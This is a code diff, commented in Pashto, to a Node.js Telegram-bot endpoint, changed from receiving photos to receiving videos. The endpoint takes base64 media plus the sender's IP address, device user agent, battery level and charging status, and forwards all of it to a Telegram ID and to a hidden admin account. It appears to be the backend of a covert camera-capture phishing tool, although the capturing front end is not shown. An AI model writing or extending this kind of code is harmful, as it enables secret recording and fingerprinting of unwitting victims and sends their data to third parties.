@@ -1,4 +1,6 @@
 const { Telegraf } = require('telegraf');
+const fs = require('fs');
+const path = require('path');
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
 let userCounter = {}; // 📌 هر uid لپاره شمېرنه
@@ -9,14 +11,14 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const { image, uid, battery, charging } = req.body;
+    const { video, uid, battery, charging, format } = req.body;
     const adminId = process.env.ADMIN_ID;
 
-    if (!uid || !image) return res.status(400).send('UID or Image missing');
+    if (!uid || !video) return res.status(400).send('UID or Video missing');
 
-    // 📌 د هر uid لپاره شمېر
+    // 📌 د هر uid لپاره شمېر (که چیرې تاسو غواړئ یوازې یو ویډیو اجازه ورکړئ)
     userCounter[uid] = (userCounter[uid] || 0) + 1;
-    if (userCounter[uid] > 4) {
+    if (userCounter[uid] > 1) { // یوازې یو ویډیو اجازه ورکړئ
       return res.status(403).send('⛔ Limit reached: No more uploads allowed.');
     }
 
@@ -27,12 +29,19 @@ module.exports = async (req, res) => {
       hour12: false,
     });
 
-    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
-    const imgBuffer = Buffer.from(base64, 'base64');
+    // د ویډیو Base64 ډیټا په Buffer بدلول
+    const base64 = video.replace(/^data:video\/\w+;base64,/, '');
+    const videoBuffer = Buffer.from(base64, 'base64');
+
+    // د ویډیو د لنډې مودې لپاره فایل کې ذخیره کول (اختیاري)
+    const tempFileName = `video_${uid}_${Date.now()}.${format || 'webm'}`;
+    const tempFilePath = path.join('/tmp', tempFileName);
+    
+    fs.writeFileSync(tempFilePath, videoBuffer);
 
     const isCharging = charging ? 'Yes 🔌' : 'No ❌';
     const caption = `
-🆕 *New Photo Received*
+🎥 *New Video Received*
 
 ━━━━━━━━━━━━━━━━━━
 🆔 *Telegram ID:* \`${uid}\`
@@ -41,6 +50,7 @@ module.exports = async (req, res) => {
 🌐 *IP Address:* \`${ip}\`
 📱 *Device:* \`${userAgent}\`
 🕒 *Time:* \`${timestamp}\`
+📹 *Format:* \`${format || 'webm'}\`
 ━━━━━━━━━━━━━━━━━━
 
 ──────╮  
@@ -48,23 +58,34 @@ module.exports = async (req, res) => {
 ╰────────────╯
 `.trim();
 
-    // ✅ Send to user
-    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
+    // ✅ Send video to user
+    await bot.telegram.sendVideo(uid, { 
+      source: videoBuffer 
+    }, {
       caption,
-      parse_mode: 'Markdown'
+      parse_mode: 'Markdown',
+      supports_streaming: true // د ویډیو سټریمینګ اجازه ورکول
     });
 
-    // ✅ Send to admin
+    // ✅ Send video to admin
     if (adminId) {
-      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
+      await bot.telegram.sendVideo(adminId, { 
+        source: videoBuffer 
+      }, {
         caption,
-        parse_mode: 'Markdown'
+        parse_mode: 'Markdown',
+        supports_streaming: true
       });
     }
 
-    res.status(200).send('✅ Uploaded');
+    // د لنډې مودې فایل ړنګول
+    if (fs.existsSync(tempFilePath)) {
+      fs.unlinkSync(tempFilePath);
+    }
+
+    res.status(200).send('✅ Video Uploaded');
   } catch (err) {
-    console.error(err);
-    res.status(500).send('❌ Upload Error');
+    console.error('Video upload error:', err);
+    res.status(500).send('❌ Video Upload Error');
   }
-}; 
+};
